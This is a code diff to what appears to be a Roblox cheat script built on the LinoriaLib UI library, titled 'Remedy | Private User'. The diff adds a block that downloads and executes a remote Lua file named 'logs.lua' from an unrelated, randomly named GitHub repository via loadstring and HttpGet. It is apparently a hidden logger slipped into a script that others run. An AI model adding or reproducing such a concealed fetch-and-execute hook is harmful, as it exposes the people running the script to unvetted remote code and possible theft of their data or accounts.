@@ -1,5 +1,3 @@
--- Import the external script
-
 -- Import LinoriaLib components from GitHub
 local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
 
@@ -8,9 +6,17 @@ local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
 local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
 
+-- Load external script
+local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
+local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
+if externalScript then
+    -- Execute the external script
+    externalScript()
+end
+
 -- Create the main window
 local Window = Library:CreateWindow({
-    Title = 'Remedy.ez | Private User',
+    Title = 'Remedy | Private User',
     Center = true,
     AutoShow = true,
     TabPadding = 8,
@@ -251,7 +257,6 @@ Library:OnUnload(function()
     print('Unloaded!')
     Library.Unloaded = true
 end)
-
 
 -- Notification
 game:GetService("StarterGui"):SetCore("SendNotification", {
